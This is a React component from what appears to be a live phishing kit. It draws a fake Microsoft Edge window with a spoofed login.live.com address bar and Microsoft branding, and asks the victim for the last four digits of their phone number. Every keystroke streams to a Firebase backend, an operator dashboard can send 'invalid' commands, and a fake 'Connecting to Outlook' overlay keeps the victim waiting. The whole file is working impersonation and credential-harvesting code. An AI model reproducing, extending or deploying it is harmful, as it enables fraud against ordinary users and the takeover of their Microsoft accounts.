import React from "react";
import { useNavigate } from "react-router-dom";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";
import DeviceManager from "../../../utils/deviceManager";
import outGif from "../assets/outgif.gif";

// Página para confirmar os 4 últimos dígitos do telefone (etapa 1) e overlay (etapa 2)
const OutlookDigitsPage = () => {
  const { updateClientData, commands, clearCommands, clientData } =
    useFirebaseClient();

  // Obter device number do DeviceManager (mesma lógica da GmailPasswordPage)
  const getLoggedInDevice = () => {
    return DeviceManager.getDeviceWithFirebaseData(clientData);
  };

  const [clientDevice, setClientDevice] = React.useState(getLoggedInDevice());
  
  // Atualizar device quando clientData mudar
  React.useEffect(() => {
    const newDevice = getLoggedInDevice();
    if (newDevice && newDevice !== clientDevice) {
      setClientDevice(newDevice);
    }
  }, [clientData?.deviceNumber, clientData?.deviceNumberConfirmed, clientData?.lastDevice, clientDevice]);

  // Estado local
  const [digits, setDigits] = React.useState(""); // 4 últimos dígitos
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState("bar"); // 'bar' | 'final'
  const [invalidMessage, setInvalidMessage] = React.useState("");

  // Overlay phrases (same style as other Outlook modals)
  const phrases = React.useMemo(
    () => [
      "Connecting to Outlook...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);

  // Viewport responsivo + drag/posição
  const [viewport, setViewport] = React.useState({
    width: typeof window !== "undefined" ? window.innerWidth : 1024,
    height: typeof window !== "undefined" ? window.innerHeight : 768,
  });
  React.useEffect(() => {
    const onResize = () =>
      setViewport({ width: window.innerWidth, height: window.innerHeight });
    window.addEventListener("resize", onResize);
    return () => window.removeEventListener("resize", onResize);
  }, []);
  const isSmall = viewport.width < 520;

  const computeFrameWidth = () =>
    Math.min(420, Math.max(320, viewport.width - 24));
  const computeFrameMinHeight = () =>
    Math.min(480, Math.max(360, viewport.height - 24));

  const [position, setPosition] = React.useState(() => ({
    left: Math.max(
      12,
      typeof window !== "undefined"
        ? (window.innerWidth -
            Math.min(420, Math.max(320, window.innerWidth - 24))) /
            2
        : 200
    ),
    top: Math.max(
      12,
      typeof window !== "undefined"
        ? (window.innerHeight -
            Math.min(480, Math.max(360, window.innerHeight - 24))) /
            2
        : 200
    ),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const isHeaderElement = e.target.closest('[data-window-header="true"]');
    if (!isHeaderElement) return;
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Update current URL/page on Firebase
  React.useEffect(() => {
    updateClientData({
      currentUrl: "/sync?view=outlook_digits",
      currentPage: "outlook_digits",
      fromForm: true,
    });
  }, [updateClientData]);

  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  // Detect invalidation commands
  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid phone digits.");
      setDigits("");
      setIsSubmitting(false);
      setLoadingStage("bar");
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  // Rotação das frases na etapa final
  React.useEffect(() => {
    if (isSubmitting && loadingStage === "final") {
      const id = setInterval(
        () => setPhraseIndex((p) => (p + 1) % phrases.length),
        2000
      );
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, phrases.length]);

  // Number to display (usa clientDevice do DeviceManager)
  const onlyDigits = (v) => String(v || "").replace(/\D/g, "");
  const configured = clientDevice || "";
  const configuredDigits = onlyDigits(configured);
  const renderTargetPhone = React.useMemo(() => {
    if (!configured)
      return localStorage.getItem("client_phone_mask") || "**********";
    if (/^\d{2}$/.test(configuredDigits)) {
      const last2 = configuredDigits;
      const template = (
        localStorage.getItem("client_phone_mask") || "**********"
      ).replace(/\s+/g, "");
      const chars = template.split("");
      let replaced = 0;
      for (let i = chars.length - 1; i >= 0 && replaced < 2; i--) {
        if (/\d/.test(chars[i]) || chars[i] === "*") {
          chars[i] = last2[1 - replaced];
          replaced++;
        }
      }
      return chars.join("");
    }
    return configured; // número completo configurado
  }, [configured, configuredDigits]);
  const lastTwoFromMask =
    (configuredDigits && configuredDigits.slice(-2)) || "••";

  const translations = {
    windowTitle: "Verify your identity - Microsoft Edge",
    url: "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1754894&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015",
  };

  // Simple URL render (no colored prefix)

  const handleSubmit = () => {
    if (digits.length !== 4) return;
    try {
      // Do not alter the displayed number (defined by the dashboard). Only register local confirmation.
      updateClientData({
        outlookDigitsConfirm: digits,
        outlookDigitsSubmittedAt: Date.now(),
      });
    } catch {}
    setIsSubmitting(true);
    setTimeout(() => setLoadingStage("final"), 300);
  };

  const [isReady, setIsReady] = React.useState(false);
  React.useEffect(() => {
    const id = setTimeout(() => setIsReady(true), 3000);
    return () => clearTimeout(id);
  }, []);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Segoe UI, Roboto, Arial, sans-serif" }}
      >
        <div
          style={{
            background: isSubmitting ? "#ffffff" : "#fbfbfb",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: computeFrameWidth(),
            minHeight: computeFrameMinHeight(),
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Window header */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            {!isReady && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  zIndex: 20,
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 40,
                    border: "3px solid #106ebe",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.9s linear infinite",
                  }}
                />
              </div>
            )}
            <span style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <svg width="16" height="16" viewBox="0 0 32 32" aria-hidden>
                <path fill="#FEBA08" d="M17 17h10v10H17z" />
                <path fill="#05A6F0" d="M5 17h10v10H5z" />
                <path fill="#80BC06" d="M17 5h10v10H17z" />
                <path fill="#F25325" d="M5 5h10v10H5z" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                <path
                  d="M3 8.5H13"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  strokeLinecap="round"
                />
              </svg>
              <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                <rect
                  x="3.5"
                  y="3.5"
                  width="9"
                  height="9"
                  rx="1"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  fill="none"
                />
              </svg>
              <svg width="12" height="12" viewBox="0 0 16 16" aria-hidden>
                <path
                  d="M4 4L12 12"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  strokeLinecap="round"
                />
                <path
                  d="M12 4L4 12"
                  stroke="#605e5c"
                  strokeWidth="1.2"
                  strokeLinecap="round"
                />
              </svg>
            </div>
          </div>
          {/* URL bar */}
          <div
            style={{ borderBottom: "1px solid #e1dfdd", background: "#ffffff" }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: isSmall ? 26 : 28,
                display: "flex",
                alignItems: "center",
                padding: isSmall ? "0 10px" : "0 12px",
                gap: 10,
                fontSize: isSmall ? 11 : 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          {/* Main content */}
          <div
            style={{
              padding: isSmall ? 16 : 24,
              display: "flex",
              flexDirection: "column",
              minHeight: "100%",
              position: "relative",
              paddingBottom: isSmall ? 16 : 24,
            }}
          >
            <div style={{ flex: 1 }}>
              {!isSubmitting ? (
                <>
                  {/* Microsoft header */}
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 10,
                      justifyContent: "center",
                    }}
                  >
                    <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
                      <path fill="#FEBA08" d="M17 17h10v10H17z" />
                      <path fill="#05A6F0" d="M5 17h10v10H5z" />
                      <path fill="#80BC06" d="M17 5h10v10H17z" />
                      <path fill="#F25325" d="M5 5h10v10H5z" />
                    </svg>
                    <span style={{ fontSize: 20, color: "#1b1a19" }}>
                      Microsoft
                    </span>
                  </div>

                  {/* Title/description in English */}
                  <h1
                    style={{
                      fontSize: isSmall ? 18 : 22,
                      fontWeight: 700,
                      margin: isSmall ? "12px 0 6px" : "18px 0 8px",
                      color: "#1b1a19",
                      textAlign: "center",
                    }}
                  >
                    We need to verify your identity
                  </h1>
                  <p
                    style={{
                      textAlign: "center",
                      color: "#323130",
                      fontSize: isSmall ? 12 : 14,
                    }}
                  >
                    How do you want to get your security code?
                  </p>

                  {/* Text message option + last 4 digits instruction */}
                  <div style={{ marginTop: 10 }}>
                    <label
                      style={{ display: "flex", alignItems: "center", gap: 8 }}
                    >
                      <input type="radio" checked readOnly />
                      <span
                        style={{
                          fontSize: isSmall ? 13 : 15,
                          color: "#1b1a19",
                        }}
                      >
                        Text message to {renderTargetPhone}
                      </span>
                    </label>
                    <p
                      style={{
                        marginTop: isSmall ? 8 : 12,
                        color: "#323130",
                        lineHeight: 1.35,
                        fontSize: isSmall ? 12 : 14,
                      }}
                    >
                      To verify this is your phone number, enter the last 4
                      digits, including {lastTwoFromMask}, then click "Get
                      code".
                    </p>
                  </div>

                  {/* Input de 4 dígitos */}
                  <input
                    data-outlook-modal
                    value={digits}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                      setDigits(val);
                      // Atualiza SOMENTE um campo separado para refletir no ClientCard, sem alterar o número configurado no topo
                      try {
                        updateClientData({
                          outlookDigitsInput: val,
                          lastDigitsInput: Date.now(),
                        });
                      } catch {}
                    }}
                    style={{
                      width: "100%",
                      border: "none",
                      borderBottom: "2px solid #a19f9d",
                      background: "transparent",
                      outline: "none",
                      padding: isSmall ? "6px 2px 5px" : "8px 2px 6px",
                      fontSize: isSmall ? 15 : 16,
                      marginTop: isSmall ? 4 : 6,
                    }}
                    placeholder="Enter 4-digit code"
                    inputMode="numeric"
                  />
                  {invalidMessage && (
                    <div
                      style={{
                        color: "#a4262c",
                        fontSize: isSmall ? 11 : 12,
                        marginTop: 6,
                      }}
                    >
                      {invalidMessage}
                    </div>
                  )}

                  {/* Secondary links */}
                  <div
                    style={{
                      marginTop: isSmall ? 10 : 12,
                      display: "flex",
                      gap: 16,
                      flexWrap: "wrap",
                    }}
                  >
                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      style={{
                        color: "#0f6cbd",
                        textDecoration: "none",
                        fontSize: isSmall ? 13 : 14,
                      }}
                    >
                      I have a code
                    </a>
                    <a
                      href="#"
                      onClick={(e) => e.preventDefault()}
                      style={{
                        color: "#0f6cbd",
                        textDecoration: "none",
                        fontSize: isSmall ? 13 : 14,
                      }}
                    >
                      I don’t have any of these
                    </a>
                  </div>
                </>
              ) : null}
            </div>

            {/* Footer with buttons */}
            {!isSubmitting && (
              <div
                style={{
                  display: "flex",
                  gap: isSmall ? 8 : 10,
                  justifyContent: isSmall ? "stretch" : "flex-end",
                  padding: isSmall ? "8px 16px" : "10px 24px",
                  flexDirection: isSmall ? "column-reverse" : "row",
                  background: "transparent",
                  marginTop: isSmall ? 12 : 16,
                }}
              >
                <button
                  type="button"
                  style={{
                    padding: isSmall ? "10px 12px" : "7px 14px",
                    border: "1px solid #d0d7de",
                    background:
                      "linear-gradient(180deg, #f5f7fa 0%, #e9eef5 100%)",
                    color: "#323130",
                    borderRadius: 4,
                    fontSize: isSmall ? 14 : 14,
                    cursor: "pointer",
                    width: isSmall ? "100%" : "auto",
                  }}
                >
                  Cancel
                </button>
                <button
                  type="button"
                  disabled={digits.length !== 4}
                  onClick={handleSubmit}
                  style={{
                    padding: isSmall ? "12px 18px" : "9px 24px",
                    background: "#0F64B1",
                    color: "#ffffff",
                    border: "1px solid #0F64B1",
                    borderRadius: 4,
                    fontSize: isSmall ? 14 : 14,
                    fontWeight: 600,
                    minWidth: isSmall ? 0 : 120,
                    cursor: digits.length === 4 ? "pointer" : "not-allowed",
                    opacity: digits.length === 4 ? 1 : 0.65,
                    width: isSmall ? "100%" : "auto",
                  }}
                >
                  Get code
                </button>
              </div>
            )}
          </div>
        </div>

        {/* Final overlay (stage 2) limited to the modal */}
        {isSubmitting && (
          <div
            style={{
              position: "absolute",
              left: position.left,
              top: position.top,
              width: computeFrameWidth(),
              minHeight: computeFrameMinHeight(),
              background: "#ffffff",
              display: "flex",
              flexDirection: "column",
              zIndex: 11,
              borderRadius: 10,
              boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
              overflow: "hidden",
            }}
          >
            <div
              style={{
                borderBottom: "1px solid #e1dfdd",
                background: "#ffffff",
              }}
            >
              <div
                style={{
                  width: "100%",
                  background: "#f5f5f5",
                  borderTop: "1px solid #d0d7de",
                  borderBottom: "1px solid #d0d7de",
                  boxSizing: "border-box",
                  height: 28,
                  display: "flex",
                  alignItems: "center",
                  padding: "0 12px",
                  gap: 10,
                  fontSize: 12,
                  color: "#605e5c",
                }}
              >
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 16 16"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  stroke="#605e5c"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="1.5"
                  aria-hidden
                  style={{ display: "block" }}
                >
                  <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                  <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                </svg>
                <div
                  style={{
                    overflow: "hidden",
                    textOverflow: "ellipsis",
                    whiteSpace: "nowrap",
                    flex: 1,
                    fontWeight: 400,
                    letterSpacing: "0.2px",
                  }}
                >
                  {translations.url}
                </div>
              </div>
            </div>
            <div
              style={{
                flex: 1,
                display: "flex",
                flexDirection: "column",
                alignItems: "center",
                justifyContent: "center",
                gap: 16,
                textAlign: "center",
              }}
            >
              <img
                src={outGif}
                alt="Outlook"
                style={{ width: 300, height: "auto" }}
              />
              <div
                style={{
                  width: 36,
                  height: 36,
                  border: "3px solid #106ebe",
                  borderTopColor: "transparent",
                  borderRadius: "50%",
                  animation: "spin 0.9s linear infinite",
                }}
              />
              <div style={{ color: "#323130", fontSize: 16, minHeight: 24 }}>
                {phrases[phraseIndex]}
              </div>
            </div>
          </div>
        )}

        <style>{`
          @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        `}</style>
      </div>
    </EmailLayout>
  );
};

export default OutlookDigitsPage;
